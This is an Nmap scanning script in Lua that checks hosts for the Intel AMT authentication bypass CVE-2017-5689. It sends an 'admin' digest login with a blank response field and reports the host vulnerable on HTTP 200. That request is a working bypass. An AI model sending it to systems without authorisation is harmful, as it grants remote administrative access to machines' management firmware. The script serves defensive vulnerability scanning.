description = [[
Detects if a system with Intel Active Management Technology is vulnerable to the INTEL-SA-00075
privilege escalation vulnerability (CVE2017-5689).

This script determines if a target is vulnerable by attempting to perform digest authentication
with a blank response parameter. If the authentication succeeds, a HTTP 200 response is received.

References:
* https://www.tenable.com/blog/rediscovering-the-intel-amt-vulnerability
]]

local string = require "string"
local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local rand = require "rand"

---
-- @usage
-- nmap -p 16992 --script http-vuln-cve2017-5689 <target>
--
-- @output
-- PORT      STATE SERVICE       REASON
-- 16992/tcp open  amt-soap-http syn-ack
-- | http-vuln-cve2017-5689:
-- |   VULNERABLE:
-- |   Intel Active Management Technology INTEL-SA-00075 Authentication Bypass
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2017-5689  BID:98269
-- |     Risk factor: High  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/AU:N/C:C/I:C/A:C)
-- |       Intel Active Management Technology is vulnerable to an authentication bypass that
-- |       can be exploited by performing digest authentication and sending a blank response
-- |       digest parameter.
-- |
-- |     Disclosure date: 2017-05-01
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5689
-- |       https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00075&languageid=en-fr
-- |       http://www.securityfocus.com/bid/98269
-- |       https://www.embedi.com/files/white-papers/Silent-Bob-is-Silent.pdf
-- |       https://www.embedi.com/news/what-you-need-know-about-intel-amt-vulnerability
-- |_      https://www.tenable.com/blog/rediscovering-the-intel-amt-vulnerability
--
-- @xmloutput
-- <table key="CVE-2017-5689">
-- <elem key="title">Intel Active Management Technology INTEL-SA-00075 Authentication Bypass</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="ids">
-- <elem>CVE:CVE-2017-5689</elem>
-- <elem>BID:98269</elem>
-- </table>
-- <table key="scores">
-- <elem key="CVSSv2">10.0 (HIGH) (AV:N/AC:L/AU:N/C:C/I:C/A:C)</elem>
-- </table>
-- <table key="description">
-- <elem>Intel Active Management Technology is vulnerable to an authentication bypass that&#xa;can be
-- exploited by performing digest authentication and sending a blank response&#xa;digest parameter.&#xa;
-- </elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="month">05</elem>
-- <elem key="day">01</elem>
-- <elem key="year">2017</elem>
-- </table>
-- </table>
-- <elem key="disclosure">2017-05-01</elem>
-- <table key="refs">
-- <elem>https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00075&amp;languageid=en-fr</elem>
-- <elem>https://www.embedi.com/files/white-papers/Silent-Bob-is-Silent.pdf</elem>
-- <elem>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5689</elem>
-- <elem>https://www.tenable.com/blog/rediscovering-the-intel-amt-vulnerability</elem>
-- <elem>https://www.embedi.com/news/what-you-need-know-about-intel-amt-vulnerability</elem>
-- <elem>http://www.securityfocus.com/bid/98269</elem>
-- </table>
-- </table>
---

author = "Andrew Orr"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "vuln", "auth", "exploit" }

portrule = shortport.port_or_service({623, 664, 16992, 16993}, "amt-soap-http")

action = function(host, port)
  local vuln = {
    title = "Intel Active Management Technology INTEL-SA-00075 Authentication Bypass",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    scores = {
      CVSSv2 = "10.0 (HIGH) (AV:N/AC:L/AU:N/C:C/I:C/A:C)",
    },
    description = [[
Intel Active Management Technology is vulnerable to an authentication bypass that
can be exploited by performing digest authentication and sending a blank response
digest parameter.
    ]],
    IDS = {CVE = "CVE-2017-5689", BID = "98269"},
    references = {
      'https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00075&languageid=en-fr',
      'https://www.embedi.com/news/what-you-need-know-about-intel-amt-vulnerability',
      'https://www.embedi.com/files/white-papers/Silent-Bob-is-Silent.pdf',
      'https://www.tenable.com/blog/rediscovering-the-intel-amt-vulnerability'
    },
    dates = { disclosure = { year = '2017', month = '05', day = '01' } }
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local response = http.get(host, port, '/index.htm')

  if response.header['server'] and response.header['server']:find('Intel(R)', 1, true)
    and response.status and response.status == 401 then
      local www_authenticate = http.parse_www_authenticate(response.header['www-authenticate'])
      if www_authenticate[1]['params'] and www_authenticate[1]['params']['realm'] and www_authenticate[1]['params']['nonce'] then
        local auth_header = string.format("Digest username=\"admin\", realm=\"%s\", nonce=\"%s\", uri=\"index.htm\"," ..
          "cnonce=\"%s\", nc=1, qop=\"auth\", response=\"\"", www_authenticate[1]['params']['realm'],
          www_authenticate[1]['params']['nonce'], rand.random_alpha(10))
        local opt = { header = { ['Authorization'] = auth_header } }
        response = http.get(host, port, '/index.htm', opt)
        if response.status and response.status == 200 then
          vuln.state = vulns.STATE.VULN
        end
      end
  end

  return vuln_report:make_output(vuln)
end
